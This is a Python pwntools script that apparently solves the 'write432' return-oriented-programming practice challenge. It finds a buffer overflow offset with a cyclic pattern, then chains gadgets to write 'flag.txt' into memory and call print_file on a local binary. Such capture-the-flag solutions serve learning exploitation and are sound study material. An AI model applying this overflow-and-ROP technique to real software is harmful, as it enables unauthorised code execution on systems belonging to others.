from pwn import *
from pprint import pprint
#context.log_level = 'DEBUG'

elf = ELF('./write432')
p = process('./write432')

# find offset
g = cyclic_gen()
t = g.get(150)
p.recvuntil(b'>')
p.sendline(t)
p.recvall()
eip = b'\x61\x61\x61\x6c'
eip = hex(unpack(eip, 32))
eip = bytes.fromhex(eip[2:]).decode()
offset = g.find(eip)[0]
log.info(f'offset: {offset}')
p.close()

# exploit
# don't have to pack, rop will deal with it
string_addr = 0x0804a018  #pack(0x0804a018, 32, 'little')
pop = 0x080485aa #pack(0x080485aa, 32, 'little') #  'pop edi', 'pop ebp', 'ret'
mov = 0x08048543 #pack(0x08048543, 32, 'little') # 0x08048543 : mov dword ptr [edi], ebp ; ret
rop = ROP('./write432')
# rop_chain
rop.raw(b'A' * offset)
rop.raw(pop)
rop.raw(string_addr)
rop.raw(b'flag') # rop will deal with it
rop.raw(mov)

rop.raw(pop)
rop.raw(string_addr + 4)
rop.raw(b'.txt') # rop will deal with it
rop.raw(mov)

rop.call('print_file',[string_addr])
payload = rop.chain()
print(rop.dump())

p = process('./write432')
p.recvuntil(b'>')
p.sendline(payload)
p.recvline()
log.success(p.recvline().decode())